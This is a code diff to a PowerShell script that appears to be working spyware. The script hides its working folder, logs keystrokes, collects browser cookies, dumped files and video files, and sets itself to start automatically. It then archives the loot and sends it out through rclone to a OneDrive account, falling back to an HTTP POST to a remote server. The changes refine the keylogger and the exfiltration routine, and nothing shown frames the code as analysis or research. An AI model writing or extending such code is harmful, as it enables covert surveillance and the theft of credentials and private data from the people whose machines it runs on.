@@ -9,6 +9,7 @@ $keylogPath = "$tempDir\keylog.txt"
 $videoDir = "$env:USERPROFILE"
 
 New-Item -ItemType Directory -Force -Path $tempDir, $cookieDir, $fileDumpDir | Out-Null
+(Get-Item $tempDir).Attributes += 'Hidden'
 Start-Transcript -Path "$tempDir\session.log" -Append
 
 function Collect-Cookies {
@@ -93,7 +94,7 @@ Start-Job -ScriptBlock {
         for ($i = 1; $i -le 255; $i++) {
             if ([KeyLogger]::GetAsyncKeyState($i) -eq -32767) {
                 $char = try { if ($map[$i]) { $map[$i] } else { [char]$i } } catch { "[?]" }
-                Add-Content -Path $logPath -Value "$(Get-Date -Format HH:mm:ss) $char" -Encoding utf8
+                Add-Content -Path $logPath -Value \"$char\" -NoNewline -Encoding utf8
             }
         }
         Start-Sleep -Milliseconds 50
@@ -115,37 +116,55 @@ function Ensure-Autostart {
 }
 
 function Archive-And-Report {
+    $videoSubDir = \"$tempDir\\video\"
+    New-Item -ItemType Directory -Path $videoSubDir -Force -ErrorAction SilentlyContinue | Out-Null
     $timestamp = Get-Date -Format "yyyyMMdd_HHmmss"
     $user = $env:USERNAME
     $videoDir = "$env:USERPROFILE\luna_video_fragments"
     $zipPath = "$env:USERPROFILE\luna_${user}_$timestamp.zip"
-
-    $report = @{ user = $user; host = $env:COMPUTERNAME; timestamp = $timestamp }
     $meta = "$tempDir\info.txt"
+    $report = @{ user = $user; host = $env:COMPUTERNAME; timestamp = $timestamp }
 
-    $report | ConvertTo-Json -Depth 5 | Set-Content -Path $logPath -Encoding utf8
-    "System: $user@$env:COMPUTERNAME`nDate: $timestamp" | Set-Content $meta
+    try {
+        $report | ConvertTo-Json -Depth 5 | Set-Content -Path $logPath -Encoding utf8
+        "System: $user@$env:COMPUTERNAME`nDate: $timestamp" | Set-Content $meta
 
-    $files = @($logPath, $meta, "$fileDumpDir\*", "$cookieDir\*", $keylogPath)
-    if (Test-Path $videoDir) {
-        $files += Get-ChildItem $videoDir -Filter *.mp4 | Select-Object -ExpandProperty FullName
+        $files = @($logPath, $meta, $keylogPath, $cookieDir, $fileDumpDir, $videoSubDir)
+        $files += Get-Item $logPath, $meta, $keylogPath -ErrorAction SilentlyContinue
+        $files += Get-ChildItem $fileDumpDir -Recurse -File -ErrorAction SilentlyContinue
+        $files += Get-ChildItem $cookieDir -Recurse -File -ErrorAction SilentlyContinue
+        if (Test-Path $videoDir) {
+            $videoFiles = Get-ChildItem $videoDir -Filter *.mp4 -File -ErrorAction SilentlyContinue
+            foreach ($vf in $videoFiles) {
+                Copy-Item $vf.FullName \"$tempDir\\video\\$($vf.Name)\" -Force -ErrorAction SilentlyContinue
+            }
+        }
+
+        Compress-Archive -Path $files.FullName -DestinationPath $zipPath -Force
+
+        & "$PSScriptRoot\rclone.exe" copy "$zipPath" "onedrive:luna_uploads/$user/$timestamp/" --config "$PSScriptRoot\rclone.conf" --quiet
+
+        if ($LASTEXITCODE -ne 0) {
+            $bytes = [System.IO.File]::ReadAllBytes($zipPath)
+            $base64 = [System.Convert]::ToBase64String($bytes)
+            $body = @{ data = $base64; filename = [IO.Path]::GetFileName($zipPath) } | ConvertTo-Json -Compress
+            Invoke-RestMethod -Uri "$serverUrl/screenshot-archive" -Method POST -Body $body -ContentType "application/json"
+        }
+
+        $summary = @"
+        PowerShell Identity Report
+        User: $user
+        Machine: $env:COMPUTERNAME
+        Time: $timestamp
+        Files: $((Get-ChildItem $fileDumpDir -Recurse -ErrorAction SilentlyContinue).Count)
+        Cookies: $((Get-ChildItem $cookieDir -Recurse -ErrorAction SilentlyContinue).Count)
+        "@
+
+    } catch {
+        Write-Warning "Archive or report failed: $_"
     }
-
-    Compress-Archive -Path $files -DestinationPath $zipPath -Force
-
-    & "$PSScriptRoot\rclone.exe" copy "$zipPath" "onedrive:luna_uploads/$user/$timestamp/" --config "$PSScriptRoot\rclone.conf" --quiet
-
-    if ($LASTEXITCODE -ne 0) {
-        # fallback to Telegram
-        $bytes = [System.IO.File]::ReadAllBytes($zipPath)
-        $base64 = [System.Convert]::ToBase64String($bytes)
-        $body = @{ data = $base64; filename = [IO.Path]::GetFileName($zipPath) } | ConvertTo-Json -Compress
-        Invoke-RestMethod -Uri "$serverUrl/screenshot-archive" -Method POST -Body $body -ContentType "application/json"
-    }
-
-    $summary = "Files: $((Get-ChildItem $fileDumpDir -Recurse -ErrorAction SilentlyContinue).Count), Cookies: $((Get-ChildItem $cookieDir -Recurse -ErrorAction SilentlyContinue).Count)"
-    Invoke-RestMethod -Uri "$serverUrl/report" -Method POST -Body (@{ text = $summary } | ConvertTo-Json -Compress) -ContentType "application/json"
 }
+
 
 function Cleanup {
     try {
